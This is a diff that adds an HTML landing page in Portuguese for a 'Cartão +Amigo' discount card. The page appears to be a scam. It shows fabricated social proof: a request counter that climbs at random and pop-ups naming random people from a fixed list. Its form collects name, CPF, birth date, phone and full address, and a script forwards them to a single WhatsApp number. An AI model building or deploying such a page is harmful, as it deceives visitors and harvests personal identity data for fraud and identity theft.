@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cartão +Amigo</title>
+<style>
+body{font-family:Arial;margin:0;background:#0d0d1f;color:white;}
+header{background:linear-gradient(90deg,#2323ff,#0066ff);padding:60px 20px;text-align:center;}
+h1{font-size:42px;margin:0;}
+.sub{opacity:0.9;font-size:18px;}
+.btn{background:#ffd000;color:black;padding:15px 35px;border-radius:8px;font-weight:bold;text-decoration:none;display:inline-block;margin-top:25px;transition:0.3s;}
+.btn:hover{transform:scale(1.1);}
+.card-area{display:flex;justify-content:center;padding:50px;}
+.card{width:330px;height:200px;border-radius:15px;position:relative;transform-style:preserve-3d;animation:rotate 8s infinite linear;}
+.front,.back{position:absolute;width:100%;height:100%;border-radius:15px;padding:25px;background:linear-gradient(135deg,#1e1eff,#00aaff);box-shadow:0 15px 40px rgba(0,0,0,0.6);backface-visibility:hidden;}
+.back{transform:rotateY(180deg);}
+@keyframes rotate{0%{transform:rotateY(0deg)}50%{transform:rotateY(180deg)}100%{transform:rotateY(360deg)}}
+.counter{text-align:center;font-size:24px;color:#ffd000;}
+.benefits{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:20px;padding:40px;}
+.box{background:#171733;padding:25px;border-radius:10px;transition:0.3s;}
+.box:hover{transform:scale(1.05);}
+.video{text-align:center;padding:40px;}
+form{background:#171733;padding:35px;margin:40px;border-radius:10px;text-align:center;}
+input{width:90%;padding:12px;margin:8px;border:none;border-radius:6px;}
+button{background:#00cc66;padding:15px 40px;border:none;border-radius:8px;color:white;font-size:16px;cursor:pointer;}
+.whatsapp{position:fixed;bottom:20px;right:20px;background:#25D366;color:white;padding:16px 22px;border-radius:50px;text-decoration:none;font-weight:bold;}
+.notification{position:fixed;bottom:100px;left:20px;background:#1a1a3a;padding:15px;border-radius:8px;display:none;}
+.chat{position:fixed;bottom:20px;left:20px;background:#1a1a3a;padding:15px;border-radius:10px;width:220px;}
+footer{text-align:center;padding:30px;opacity:0.6;}
+</style>
+</head>
+<body>
+
+<header>
+<h1>💳 Cartão +Amigo</h1>
+<p class="sub">Descontos em mercados, farmácias, saúde e educação</p>
+<a href="#form" class="btn">PEDIR MEU CARTÃO</a>
+</header>
+
+<div class="card-area">
+<div class="card">
+<div class="front">
+<h3>+AMIGO CARD</h3>
+<p>PEDRINN HENRIQUE</p>
+<p>5454 •••• •••• 8721</p>
+<p>12/30</p>
+</div>
+<div class="back">
+<p>CVV 345</p>
+<p>Visa Platinum</p>
+</div>
+</div>
+</div>
+
+<div class="counter">
+🔥 <span id="contador">1284</span> pessoas pediram hoje
+</div>
+
+<section class="benefits">
+<div class="box"><h3>💰 Mercado</h3><p>5% de desconto em carnes, arroz, feijão e leite.</p></div>
+<div class="box"><h3>💊 Farmácias</h3><p>Descontos em drogarias e medicamentos.</p></div>
+<div class="box"><h3>🏥 Saúde</h3><p>Consultas médicas e exames com desconto.</p></div>
+<div class="box"><h3>🎓 Educação</h3><p>Cursos com até 80% de desconto.</p></div>
+<div class="box"><h3>🌎 Internacional</h3><p>Aceito no Brasil e exterior.</p></div>
+<div class="box"><h3>📱 Aplicativo</h3><p>Controle de compras e limite pelo app.</p></div>
+</section>
+
+<div class="video">
+<h2>Conheça o Cartão +Amigo</h2>
+<video width="320" height="180" controls autoplay muted style="border-radius:12px; box-shadow:0 10px 30px rgba(0,0,0,0.5);">
+<source src="VID-20260309-WA0049~2.mp4" type="video/mp4">
+Seu navegador não suporta vídeo.
+</video>
+<p style="margin-top:15px;opacity:0.8;">
+Veja no vídeo como solicitar seu Cartão +Amigo e aproveitar os benefícios.
+</p>
+</div>
+
+<form id="form">
+<h2>Solicite seu Cartão</h2>
+<input placeholder="Nome completo">
+<input placeholder="CPF">
+<input placeholder="Data de nascimento">
+<input placeholder="Telefone / WhatsApp">
+<input placeholder="CEP">
+<input placeholder="Rua">
+<input placeholder="Número">
+<input placeholder="Ponto de referência">
+<br><br>
+<button>QUERO MEU CARTÃO</button>
+</form>
+
+<div class="notification" id="notify"></div>
+
+<div class="chat">
+💬 Olá!<br>
+Posso ajudar você a pedir seu Cartão +Amigo?
+</div>
+
+<a class="whatsapp" href="https://wa.me/5544997187738?text=Olá%20quero%20pedir%20o%20Cartão%20+Amigo">
+WhatsApp
+</a>
+
+<footer>
+Cartão +Amigo © 2026
+</footer>
+
+<script>
+let numero = 1284;
+setInterval(()=>{
+numero += Math.floor(Math.random()*3)+1;
+document.getElementById("contador").innerText = numero;
+},50000)
+
+const nomes=["Carlos","Fernanda","Juliana","Paulo","Amanda","Roberto"];
+const cidades=["Curitiba","São Paulo","Rio de Janeiro","Londrina","Maringá"];
+
+setInterval(()=>{
+let nome=nomes[Math.floor(Math.random()*nomes.length)];
+let cidade=cidades[Math.floor(Math.random()*cidades.length)];
+let box=document.getElementById("notify");
+box.innerText="🔥 "+nome+" de "+cidade+" acabou de solicitar o Cartão +Amigo";
+box.style.display="block";
+setTimeout(()=>{box.style.display="none";},4000)
+},9000)
+
+document.querySelector("form").addEventListener("submit", function(e){
+e.preventDefault();
+let inputs = document.querySelectorAll("input");
+let dados = `
+Novo pedido de Cartão +Amigo
+
+Nome: ${inputs[0].value}
+CPF: ${inputs[1].value}
+Nascimento: ${inputs[2].value}
+Telefone: ${inputs[3].value}
+CEP: ${inputs[4].value}
+Rua: ${inputs[5].value}
+Número: ${inputs[6].value}
+Referência: ${inputs[7].value}
+`;
+let url = "https://wa.me/5544997187738?text=" + encodeURIComponent(dados);
+window.open(url,"_blank");
+});
+</script>
+
+</body>
+</html>
